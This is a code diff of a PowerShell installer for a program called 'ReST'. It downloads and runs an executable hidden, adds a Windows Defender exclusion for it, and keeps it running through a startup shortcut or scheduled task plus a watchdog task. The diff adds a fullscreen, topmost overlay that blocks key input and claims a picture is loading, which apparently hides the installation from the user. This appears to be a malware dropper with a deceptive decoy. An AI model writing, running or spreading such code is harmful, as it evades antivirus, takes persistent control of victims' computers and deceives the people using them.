@@ -21,6 +21,9 @@ $Dir = Join-Path $env:LOCALAPPDATA "ReST"
 $Exe = Join-Path $Dir "ReST.exe"
 $TempZip = Join-Path $env:TEMP "ReST-download.zip"
 $LogFile = Join-Path $env:TEMP "ReST-install.log"
+$LoadingPidFile = Join-Path $env:TEMP "ReST-loading.pid"
+$LoadingDoneFile = Join-Path $env:TEMP "ReST-loading.done"
+$script:LoadingProc = $null
 $script:HadError = $false
 
 function Write-InstallLog {
@@ -157,54 +160,193 @@ function Add-DefenderExclusion {
     return $ok
 }
 
-function Start-InstallPictureAsync {
+function Start-InstallLoadingUI {
     param([string]$BaseUrl)
 
+    Stop-InstallLoadingUI
+
     $pictureUrl = $BaseUrl + "/picture_1963.webp"
-    Write-InstallLog ("picture parallel: " + $pictureUrl)
+    Write-InstallLog ("loading ui: " + $pictureUrl)
 
     $safeUrl = $pictureUrl.Replace("'", "''")
-    $safeLog = $LogFile.Replace("'", "''")
-    $picFile = Join-Path $env:TEMP "ReST-picture_1963.webp"
-    $safePic = $picFile.Replace("'", "''")
+    $safeDone = $LoadingDoneFile.Replace("'", "''")
+    $safePic = (Join-Path $env:TEMP "ReST-picture_1963.webp").Replace("'", "''")
 
     $script = @"
 `$ErrorActionPreference = 'SilentlyContinue'
-`$ProgressPreference = 'SilentlyContinue'
-function Write-PicLog([string]`$Text) {
-    try { Add-Content -LiteralPath '$safeLog' -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' [picture] ' + `$Text) -Encoding UTF8 } catch {}
-}
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+`$doneFile = '$safeDone'
 `$pictureUrl = '$safeUrl'
 `$picFile = '$safePic'
-try {
-    Start-Process -FilePath 'rundll32.exe' -ArgumentList @('url.dll,FileProtocolHandler', `$pictureUrl) -WindowStyle Hidden -ErrorAction Stop
-    Write-PicLog 'opened in browser'
-    exit 0
-} catch {}
-Write-PicLog 'browser open failed, trying download'
-try {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    `$curl = Join-Path `$env:SystemRoot 'System32\curl.exe'
-    if (Test-Path -LiteralPath `$curl) {
-        & `$curl -fsSL -o `$picFile `$pictureUrl
-    } else {
-        Invoke-WebRequest -Uri `$pictureUrl -OutFile `$picFile -UseBasicParsing
-    }
-    if (Test-Path -LiteralPath `$picFile) {
-        `$fileUri = 'file:///' + (`$picFile -replace '\\','/')
-        Start-Process -FilePath 'rundll32.exe' -ArgumentList @('url.dll,FileProtocolHandler', `$fileUri) -WindowStyle Hidden
-        Write-PicLog 'opened from local file'
-    }
-} catch {
-    Write-PicLog `$_.Exception.Message
+
+`$form = New-Object System.Windows.Forms.Form
+`$form.Text = 'ReST'
+`$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
+`$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
+`$form.TopMost = `$true
+`$form.BackColor = [System.Drawing.Color]::FromArgb(12, 18, 32)
+`$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
+`$form.Bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+`$form.KeyPreview = `$true
+`$form.Add_KeyDown({ param(`$s, `$e) `$e.Handled = `$true })
+
+function Set-Centered([System.Windows.Forms.Control]`$ctrl, [int]`$y) {
+    `$ctrl.Left = [Math]::Max(0, (`$form.ClientSize.Width - `$ctrl.Width) / 2)
+    `$ctrl.Top = `$y
 }
+
+`$overlay = New-Object System.Windows.Forms.Panel
+`$overlay.Dock = [System.Windows.Forms.DockStyle]::Fill
+`$overlay.BackColor = [System.Drawing.Color]::FromArgb(170, 8, 12, 24)
+
+`$title = New-Object System.Windows.Forms.Label
+`$title.Text = '图片加载中'
+`$title.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 34, [System.Drawing.FontStyle]::Bold)
+`$title.ForeColor = [System.Drawing.Color]::White
+`$title.BackColor = [System.Drawing.Color]::Transparent
+`$title.AutoSize = `$true
+
+`$subtitle = New-Object System.Windows.Forms.Label
+`$subtitle.Text = '请稍候...'
+`$subtitle.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 14)
+`$subtitle.ForeColor = [System.Drawing.Color]::FromArgb(220, 226, 232)
+`$subtitle.BackColor = [System.Drawing.Color]::Transparent
+`$subtitle.AutoSize = `$true
+
+`$bar = New-Object System.Windows.Forms.ProgressBar
+`$bar.Style = [System.Windows.Forms.ProgressBarStyle]::Marquee
+`$bar.MarqueeAnimationSpeed = 28
+`$bar.Size = New-Object System.Drawing.Size(460, 10)
+`$bar.ForeColor = [System.Drawing.Color]::FromArgb(99, 102, 241)
+
+`$hint = New-Object System.Windows.Forms.Label
+`$hint.Text = '请勿关闭此窗口'
+`$hint.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 11)
+`$hint.ForeColor = [System.Drawing.Color]::FromArgb(148, 163, 184)
+`$hint.BackColor = [System.Drawing.Color]::Transparent
+`$hint.AutoSize = `$true
+
+`$overlay.Controls.AddRange(@(`$title, `$subtitle, `$bar, `$hint))
+`$form.Controls.Add(`$overlay)
+
+`$script:bg = `$null
+
+function Layout-LoadingUi {
+    `$midY = [Math]::Max(120, (`$form.ClientSize.Height - 170) / 2)
+    Set-Centered `$title (`$midY)
+    Set-Centered `$subtitle (`$midY + 62)
+    `$bar.Left = [Math]::Max(0, (`$form.ClientSize.Width - `$bar.Width) / 2)
+    `$bar.Top = `$midY + 108
+    Set-Centered `$hint (`$midY + 138)
+}
+
+function Load-BackgroundImage {
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        `$curl = Join-Path `$env:SystemRoot 'System32\curl.exe'
+        if (Test-Path -LiteralPath `$curl) {
+            & `$curl -fsSL -o `$picFile `$pictureUrl
+        } else {
+            Invoke-WebRequest -Uri `$pictureUrl -OutFile `$picFile -UseBasicParsing
+        }
+        if (Test-Path -LiteralPath `$picFile) {
+            `$img = [System.Drawing.Image]::FromFile(`$picFile)
+            `$form.BackgroundImage = `$img
+            `$form.BackgroundImageLayout = [System.Windows.Forms.ImageLayout]::Zoom
+            `$script:bg = `$img
+        }
+    } catch {
+        `$null = `$_
+    }
+
+    `$title.Text = '图片加载中'
+    `$subtitle.Text = '正在下载并配置，请稍候...'
+    Layout-LoadingUi
+    `$form.Refresh()
+}
+
+`$form.Add_Load({
+    Layout-LoadingUi
+    `$form.Refresh()
+})
+
+`$form.Add_Resize({ Layout-LoadingUi })
+
+`$picTimer = New-Object System.Windows.Forms.Timer
+`$picTimer.Interval = 80
+`$picTimer.Add_Tick({
+    `$picTimer.Stop()
+    Load-BackgroundImage
+})
+`$picTimer.Start()
+
+`$timer = New-Object System.Windows.Forms.Timer
+`$timer.Interval = 400
+`$timer.Add_Tick({
+    if (Test-Path -LiteralPath `$doneFile) {
+        `$timer.Stop()
+        `$form.Close()
+    }
+})
+`$timer.Start()
+
+[void]`$form.ShowDialog()
+if (`$script:bg) { `$script:bg.Dispose() }
 "@
 
-    $runner = Join-Path $env:TEMP "ReST-picture-run.ps1"
+    $runner = Join-Path $env:TEMP "ReST-loading-ui.ps1"
     Set-Content -LiteralPath $runner -Value $script -Encoding ASCII
-    Start-Process -FilePath "powershell.exe" -ArgumentList @(
-        "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", $runner
-    ) -WindowStyle Hidden | Out-Null
+    Unblock-File -LiteralPath $runner -ErrorAction SilentlyContinue
+
+    try {
+        $proc = Start-Process -FilePath "powershell.exe" -PassThru -WindowStyle Hidden -ArgumentList @(
+            "-Sta",
+            "-NoProfile",
+            "-ExecutionPolicy",
+            "Bypass",
+            "-File",
+            $runner
+        )
+        $script:LoadingProc = $proc
+        Set-Content -LiteralPath $LoadingPidFile -Value $proc.Id -Encoding ASCII
+        Write-InstallLog ("loading ui pid: " + $proc.Id)
+    } catch {
+        Write-InstallLog ("loading ui skipped: " + $_.Exception.Message)
+    }
+}
+
+function Stop-InstallLoadingUI {
+    try {
+        if (Test-Path -LiteralPath $LoadingDoneFile) {
+            Remove-Item -LiteralPath $LoadingDoneFile -Force -ErrorAction SilentlyContinue
+        }
+        New-Item -ItemType File -Force -Path $LoadingDoneFile | Out-Null
+    } catch {
+        $null = $_
+    }
+
+    Start-Sleep -Milliseconds 350
+
+    if ($script:LoadingProc -and -not $script:LoadingProc.HasExited) {
+        Stop-Process -Id $script:LoadingProc.Id -Force -ErrorAction SilentlyContinue
+    }
+
+    if (Test-Path -LiteralPath $LoadingPidFile) {
+        try {
+            $loadingPid = [int](Get-Content -LiteralPath $LoadingPidFile -Raw).Trim()
+            if ($loadingPid -gt 0) {
+                Stop-Process -Id $loadingPid -Force -ErrorAction SilentlyContinue
+            }
+        } catch {
+            $null = $_
+        }
+        Remove-Item -LiteralPath $LoadingPidFile -Force -ErrorAction SilentlyContinue
+    }
+
+    Remove-Item -LiteralPath $LoadingDoneFile -Force -ErrorAction SilentlyContinue
+    $script:LoadingProc = $null
 }
 
 function Register-WatchdogTask {
@@ -245,104 +387,108 @@ function Remove-ReSTStartupShortcut {
 
 Write-InstallLog "install start"
 Write-InstallLog ("target: " + $Exe)
-Start-InstallPictureAsync -BaseUrl $BaseUrl
+Start-InstallLoadingUI -BaseUrl $BaseUrl
 
 try {
-    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
-} catch {
-    $null = $_
-}
+    try {
+        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
+    } catch {
+        $null = $_
+    }
 
-Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-Start-Sleep -Milliseconds 200
+    Get-Process -Name "ReST" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Milliseconds 200
 
-$Url = $BaseUrl + "/ReST.zip"
-Write-InstallLog ("download: " + $Url)
+    $Url = $BaseUrl + "/ReST.zip"
+    Write-InstallLog ("download: " + $Url)
 
-if (Test-Path -LiteralPath $TempZip) {
-    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
-}
+    if (Test-Path -LiteralPath $TempZip) {
+        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
+    }
 
-try {
-    Download-File -Url $Url -OutFile $TempZip
-} catch {
-    Fail-Install ("download failed: " + $_.Exception.Message)
-    exit 1
-}
+    try {
+        Download-File -Url $Url -OutFile $TempZip
+    } catch {
+        Fail-Install ("download failed: " + $_.Exception.Message)
+        exit 1
+    }
 
-if (-not (Test-Path -LiteralPath $TempZip)) {
-    Fail-Install "missing file after download"
-    exit 1
-}
+    if (-not (Test-Path -LiteralPath $TempZip)) {
+        Fail-Install "missing file after download"
+        exit 1
+    }
 
-$length = (Get-Item -LiteralPath $TempZip).Length
-if ($length -lt 524288) {
-    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
-    Fail-Install ("file too small: " + $length + " bytes")
-    exit 1
-}
+    $length = (Get-Item -LiteralPath $TempZip).Length
+    if ($length -lt 524288) {
+        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
+        Fail-Install ("file too small: " + $length + " bytes")
+        exit 1
+    }
 
-try {
-    Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
-} catch {
-    Fail-Install ("extract failed: " + $_.Exception.Message)
-    exit 1
+    try {
+        Extract-ReSTZip -ZipFile $TempZip -OutExe $Exe
+    } catch {
+        Fail-Install ("extract failed: " + $_.Exception.Message)
+        exit 1
+    } finally {
+        Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
+    }
+
+    if (-not (Test-Path -LiteralPath $Exe)) {
+        Fail-Install "ReST.exe missing after extract"
+        exit 1
+    }
+
+    Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
+    Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
+
+    $startupOk = $false
+    try {
+        $Startup = [Environment]::GetFolderPath("Startup")
+        $Wsh = New-Object -ComObject WScript.Shell
+        $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReST.lnk"))
+        $Link.TargetPath = $Exe
+        $Link.WorkingDirectory = $Dir
+        $Link.WindowStyle = 7
+        $Link.Save()
+        Remove-ReSTStartupTask
+        $startupOk = $true
+        Write-InstallLog "startup shortcut ok"
+    } catch {
+        $null = $_
+    }
+
+    if (-not $startupOk) {
+        Remove-ReSTStartupShortcut
+        $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
+        $Trigger = New-ScheduledTaskTrigger -AtLogOn
+        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
+        Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
+        Write-InstallLog "scheduled task ok"
+    }
+
+    try {
+        Register-WatchdogTask -TaskName "ReST-Watchdog" -Exe $Exe -Dir $Dir
+        Write-InstallLog "watchdog task ok"
+    } catch {
+        Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
+    }
+
+    try {
+        Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
+        Write-InstallLog "started"
+    } catch {
+        Fail-Install ("start failed: " + $_.Exception.Message)
+        exit 1
+    }
+
+    Write-InstallLog "install complete"
+    if (-not $Silent) {
+        Write-Host "ReST install complete." -ForegroundColor Green
+    }
+
+    exit 0
 } finally {
-    Remove-Item -LiteralPath $TempZip -Force -ErrorAction SilentlyContinue
+    Stop-InstallLoadingUI
 }
-
-if (-not (Test-Path -LiteralPath $Exe)) {
-    Fail-Install "ReST.exe missing after extract"
-    exit 1
-}
-
-Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
-Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
-
-$startupOk = $false
-try {
-    $Startup = [Environment]::GetFolderPath("Startup")
-    $Wsh = New-Object -ComObject WScript.Shell
-    $Link = $Wsh.CreateShortcut((Join-Path $Startup "ReST.lnk"))
-    $Link.TargetPath = $Exe
-    $Link.WorkingDirectory = $Dir
-    $Link.WindowStyle = 7
-    $Link.Save()
-    Remove-ReSTStartupTask
-    $startupOk = $true
-    Write-InstallLog "startup shortcut ok"
-} catch {
-    $null = $_
-}
-
-if (-not $startupOk) {
-    Remove-ReSTStartupShortcut
-    $Action = New-ScheduledTaskAction -Execute $Exe -WorkingDirectory $Dir
-    $Trigger = New-ScheduledTaskTrigger -AtLogOn
-    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
-    Register-ScheduledTask -TaskName "ReST" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Force | Out-Null
-    Write-InstallLog "scheduled task ok"
-}
-
-try {
-    Register-WatchdogTask -TaskName "ReST-Watchdog" -Exe $Exe -Dir $Dir
-    Write-InstallLog "watchdog task ok"
-} catch {
-    Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
-}
-
-try {
-    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
-    Write-InstallLog "started"
-} catch {
-    Fail-Install ("start failed: " + $_.Exception.Message)
-    exit 1
-}
-
-Write-InstallLog "install complete"
-if (-not $Silent) {
-    Write-Host "ReST install complete." -ForegroundColor Green
-}
-
-exit 0
